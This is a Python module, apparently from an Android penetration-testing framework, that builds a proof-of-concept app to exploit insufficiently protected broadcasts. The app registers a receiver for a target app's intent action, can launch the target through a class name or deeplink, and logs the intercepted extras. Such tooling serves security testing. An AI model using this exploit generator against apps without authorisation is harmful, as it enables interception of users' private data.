from modules.android.app.app import App
from modules.android.app.template import Template
from settings.logger import get_logger
from state.opt_bool import OptBool
from state.opt_list import OptList
from state.opt_str import OptStr
from state.options import option_state


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "insecure_broadcast_insufficient_protection"
        self._template = Template()


    def register_options(self):
        option_state.add_options([
            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: True)", False]),
            OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
            OptStr("PERMISSION", [True, "Broadcast permission"]),
            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
            OptStr("TARGET_PACKAGE", [True, "Target package name"]),
            OptStr("TARGET_CLASS", [False, "Target class name"]),
            OptStr("INTENT_FILTER", [True, "Intent action to intercept"]),
            OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
            OptList("BUNDLE_STRING", [False, "String bundle key"]),
            OptList("PUT_EXTRA", [False, "Intent extra data"]),
            OptList("BROADCAST_EXTRA", [True, "Target broadcast intent extra data"])
        ])
        self.update_option_status()


    def update_option_status(self):
        opts = option_state.get_all_options()
        stat_dict = {
            "via_deeplink": {
                "pos": ["deeplink_uri"],
                "neg": ["target_class"]
            },
            "is_exported": {
                "pos": ["via_deeplink", "target_class"],
                "neg": []
            },
        }
        super().update_option_status(stat_dict, opts)


    def execute(self):
        opts = self.get_options_value()

        is_exported = opts['IS_EXPORTED']
        via_deeplink = opts['VIA_DEEPLINK']
        permission = opts['PERMISSION']
        deeplink_uri = opts['DEEPLINK_URI']
        target_package = opts['TARGET_PACKAGE']
        target_class = opts['TARGET_CLASS']
        intent_filter = opts['INTENT_FILTER']
        bundle_extra = opts['BUNDLE_EXTRA']
        bundle_string = opts['BUNDLE_STRING']
        put_extra = opts['PUT_EXTRA']
        broadcast_extra = opts['BROADCAST_EXTRA']

        exploit_activity_name = self.activity_name(self._id, target_package)

        register_receiver=[
            self._template.register_receiver(intent_filter=intent_filter),
            self._template.build_intent(
                set_action="android.intent.action.VIEW" if via_deeplink else None,
                set_data=f'"{deeplink_uri}"' if via_deeplink else None,
                set_classname=[target_package, target_class] if not via_deeplink else [],
                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
            )
        ]

        if not is_exported:
            register_receiver.pop()

        component = self._template.build_activity(
            name=exploit_activity_name,
            libs=[
                "android.content.BroadcastReceiver",
                "android.content.Context",
                "android.content.Intent",
                "android.content.IntentFilter",
                "android.content.pm.PackageManager",
                "android.os.Bundle",
                "android.util.Log",
                "android.widget.Toast",
                "androidx.activity.result.ActivityResultLauncher",
                "androidx.activity.result.contract.ActivityResultContracts",
                "androidx.appcompat.app.AppCompatActivity",
                "androidx.core.app.ActivityCompat"
            ],
            bind_button=True,
            on_create=[
                f'Toast.makeText(this, "Registering receiver with action: {intent_filter}", Toast.LENGTH_SHORT).show();',
                self._template.request_permission(
                    permission=permission,
                    granted_content=register_receiver,
                    ungranted_content=[
                        f'requestPermission.launch("{permission}");'
                    ]
                )
            ],
            on_destroy=[
                f"unregisterReceiver(receiver);"
            ],
            listener=[
                self._template.build_dynamic_receiver(
                    on_receive=[
                        f'Bundle bundle = intent.getBundleExtra("{bundle_extra}");' if bundle_extra != "" else "",
                        "StringBuilder sb = new StringBuilder();",
                        ''.join([f'String data{i} = bundle.getString("{string[0]}");\nsb.append(data{i}).append(";");\n' for i,string in enumerate(bundle_string)]) if bundle_extra != "" else "",
                        ''.join([f'String data{i} = intent.getStringExtra("{extra[0]}");\nsb.append(data{i}).append(";");\n' for i,extra in enumerate(broadcast_extra)]),
                        'Log.i("BINGO!", "Data:" + sb);'
                    ]
                ),
                self._template.build_request_permission_launcher(
                    process_result=register_receiver
                )
            ]
        )

        app = {
            "manifest": [
                self._template.build_manifest_component(exploit_activity_name)
            ],
            "layout": self._template.button_layout(self._id, target_package),
            "bind_button": self._template.bind_button(self._id, target_package),
            "component": [
                {
                    "name": f"{exploit_activity_name}.java",
                    "content": component 
                }
            ],
            "permission": self._template.permission_manifest(permission)
        }

        build_app = self.build(app)
        if not build_app:
            log.error("Module failed to execute, terminating module..\n")
            return

        self.check_component_log(opts)

        self.check_logcat()